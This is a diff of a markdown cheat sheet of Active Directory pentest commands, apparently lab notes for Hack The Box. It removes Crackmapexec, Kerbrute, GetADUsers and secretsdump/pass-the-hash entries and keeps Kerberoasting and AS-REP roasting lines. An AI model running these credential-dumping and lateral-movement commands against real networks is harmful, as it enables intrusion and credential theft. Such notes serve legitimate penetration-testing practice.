@@ -1,34 +1,5 @@
 # Tools
 
-## Crackmapexec
-
-```bash
-crackmapexec smb <IP> -u <username(s)> -p <password(s)>
-
-crackmapexec winrm <IP> -u <username(s)> -p <password(s)>
-crackmapexec winrm <IP> -u <username(s)> -p <password(s)> -X "whoami"  # Run a command
-```
-
-## Kerbrute
-
-Identify potential valid users
-
-```bash
-kerbrute userenum --dc <IP> -d <domain.local> users.txt
-# Can verify working by placing known users in user.txt i.e. administrato, guest,
-
-```
-
-## Impacket
-
-#### GetADUsers
-
-Queries target domain for users data
-
-```bash
-GetADUsers.py -all -dc-ip <IP> active.htb/svc_tgs   # Will need account creds
-```
-
 #### GetNPUsers
 
 Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
@@ -57,19 +28,7 @@ GetUserSPNs.py -request -dc-ip <IP> active.htb/svc_tgs
 # Crack found hashes then try to psexec
 ```
 
-#### secretsdump
 
-Performs various techniques to dump secrets from the remote machine without executing any agent there.
-
-```bash
-secretsdump.py htb.local/<username>@<IP>
-secretsdump.py htb.local/<username>:<password>@<IP>
-# Grab the hashes then attempt to crack or pass the hash
-# Pass the hash
-crackmapexec smb <IP> -u administrator -H <hash>
-# If Pwn3d!...
-psexec.py -hashes <hash> administrator@<IP>
-```
 
 ## PowerView
 
